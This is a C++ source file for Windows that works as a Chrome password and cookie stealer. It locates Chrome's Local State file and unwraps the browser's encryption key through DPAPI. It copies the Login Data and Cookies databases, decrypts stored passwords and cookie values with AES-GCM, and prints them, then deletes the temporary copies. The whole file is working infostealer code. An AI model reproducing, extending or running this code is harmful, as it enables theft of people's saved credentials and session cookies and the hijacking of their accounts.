#include "sqlite3.h"
#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <wincrypt.h>
#include <iostream>
#include <fstream>
#include <shlobj.h>
#include "json.hpp"
#include "../aes_gcm/aes_gcm.h"

using json = nlohmann::json;

wchar_t *charToWChar(char *text)
{
    const size_t size = strlen(text) + 1;
    wchar_t *wText = new wchar_t[size];
    mbstowcs(wText, text, size);
    return wText;
}

int wmain()
{
    // Get Local State File Location
    TCHAR location[MAX_PATH];
    WCHAR *local_state = L"\\Google\\Chrome\\User Data\\Local State";
    SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, location);
    lstrcat(location, local_state);

    // Read file into JSON
    std::ifstream ifs(location);
    json j = json::parse(ifs);
    auto key = j["os_crypt"]["encrypted_key"].get<std::string>();
    auto wkey = charToWChar(&key[0]);

    // Decode B64 Key
    DWORD binaryBuffLength = 0;
    std::vector<BYTE> binaryData;
    CryptStringToBinary(wkey, wcslen(wkey), CRYPT_STRING_BASE64, NULL, &binaryBuffLength, NULL, NULL);
    binaryData.resize(binaryBuffLength);
    CryptStringToBinary(wkey, wcslen(wkey), CRYPT_STRING_BASE64, &binaryData[0], &binaryBuffLength, NULL, NULL);
    std::vector<BYTE> decodedKey(binaryData.begin() + 5, binaryData.end());
    
    // Unprotect Decoded Key
    DATA_BLOB encrypted, decrypted;
    encrypted.pbData = &decodedKey[0];
    encrypted.cbData = decodedKey.size();
    CryptUnprotectData(&encrypted, NULL, NULL, NULL, NULL, 0, &decrypted);

    // Setup AES_GCM
    NTSTATUS nStatus;
    BCRYPT_ALG_HANDLE hAlg = 0;
    BCRYPT_KEY_HANDLE hKey = NULL;
    nStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    nStatus = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (BYTE *)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    nStatus = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, decrypted.pbData, decrypted.cbData, 0);

    // Create copy of SQLite Passwords DB
    TCHAR db_location[MAX_PATH];
    WCHAR *login_data = L"\\Google\\Chrome\\User Data\\Default\\Login Data";
    WCHAR *temp_db = L".\\passwords_db";
    SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, db_location);
    lstrcat(db_location, login_data);
    CopyFile(db_location, temp_db, FALSE);

    // Open Passwords DB
    sqlite3 *db = NULL;
    sqlite3_stmt *stmt;
    auto status = sqlite3_open_v2("passwords_db", &db, SQLITE_OPEN_READONLY, NULL);
    if (status != SQLITE_OK)
    {
        sqlite3_close(db);
        DeleteFile(temp_db);
    }
    status = sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, 0);
    if (status != SQLITE_OK)
    {
        sqlite3_close(db);
        DeleteFile(temp_db);
    }
    int i = 0;
    while (sqlite3_step(stmt) == SQLITE_ROW && i < 6)
    {
        std::string url = (const char *)sqlite3_column_text(stmt, 0);
        std::string login = (const char *)sqlite3_column_text(stmt, 1);
        std::string enc_password = (const char *)sqlite3_column_text(stmt, 2);
        std::string iv(enc_password.begin() + 3, enc_password.begin() + 15);
        std::string ciphertext(enc_password.begin() + 15, enc_password.end() - 16);
        std::string mac(enc_password.end() - 16, enc_password.end());
        
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = (BYTE *)iv.c_str();
        authInfo.cbNonce = iv.length();
        authInfo.pbTag = (BYTE *)mac.c_str();
        authInfo.cbTag = mac.length();

        DWORD ptBufferSize = 0;
        BYTE* password = NULL;
        
        BCryptDecrypt(hKey, (BYTE *)ciphertext.c_str(), ciphertext.length(), &authInfo, (BYTE *)iv.c_str(), iv.length(), NULL, ptBufferSize, &ptBufferSize, 0);
        password = new BYTE[ptBufferSize];
        BCryptDecrypt(hKey, (BYTE *)ciphertext.c_str(), ciphertext.length(), &authInfo, (BYTE *)iv.c_str(), iv.length(), &password[0], ptBufferSize, &ptBufferSize, 0);
        
        std::cout << "URL: " << url.c_str() << std::endl;
        std::cout << "Login: " << login.c_str() << std::endl;
        std::cout << "Password: " << password << std::endl;
        i++;
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    // Create copy of SQLite Cookies DB
    TCHAR cookies_db_location[MAX_PATH];
    WCHAR *cookies_data = L"\\Google\\Chrome\\User Data\\Default\\Cookies";
    WCHAR *temp_cookies_db = L".\\cookies_db";
    SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, cookies_db_location);
    lstrcat(cookies_db_location, cookies_data);
    CopyFile(cookies_db_location, temp_cookies_db, FALSE);

    // Open Cookies DB
    sqlite3 *cookies_db = NULL;
    sqlite3_stmt *cookies_stmt;
    auto cookies_status = sqlite3_open_v2("cookies_db", &cookies_db, SQLITE_OPEN_READONLY, NULL);
    if (cookies_status != SQLITE_OK)
    {
        sqlite3_close(cookies_db);
        DeleteFile(temp_cookies_db);
    }
    cookies_status = sqlite3_prepare_v2(cookies_db, "SELECT host_key, encrypted_value FROM cookies", -1, &cookies_stmt, 0);
    if (cookies_status != SQLITE_OK)
    {
        sqlite3_close(cookies_db);
        DeleteFile(temp_cookies_db);
    }
    int k = 0;
    while (sqlite3_step(cookies_stmt) == SQLITE_ROW && k < 6)
    {
        std::string url = (const char *)sqlite3_column_text(cookies_stmt, 0);
        std::string enc_value = (const char *)sqlite3_column_text(cookies_stmt, 1);
        std::string iv(enc_value.begin() + 3, enc_value.begin() + 15);
        std::string ciphertext(enc_value.begin() + 15, enc_value.end() - 16);
        std::string mac(enc_value.end() - 16, enc_value.end());
        
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = (BYTE *)iv.c_str();
        authInfo.cbNonce = iv.length();
        authInfo.pbTag = (BYTE *)mac.c_str();
        authInfo.cbTag = mac.length();

        DWORD ptBufferSize = 0;
        BYTE* value = NULL;
        
        BCryptDecrypt(hKey, (BYTE *)ciphertext.c_str(), ciphertext.length(), &authInfo, (BYTE *)iv.c_str(), iv.length(), NULL, ptBufferSize, &ptBufferSize, 0);
        value = new BYTE[ptBufferSize];
        BCryptDecrypt(hKey, (BYTE *)ciphertext.c_str(), ciphertext.length(), &authInfo, (BYTE *)iv.c_str(), iv.length(), &value[0], ptBufferSize, &ptBufferSize, 0);
        
        std::cout << "URL: " << url.c_str() << std::endl;
        std::cout << "Value: " << value << std::endl;
        k++;
    }
    sqlite3_finalize(cookies_stmt);
    sqlite3_close(cookies_db);

    // Delete Copied Files
    DeleteFile(temp_cookies_db);
    DeleteFile(temp_db);

    return 0;
}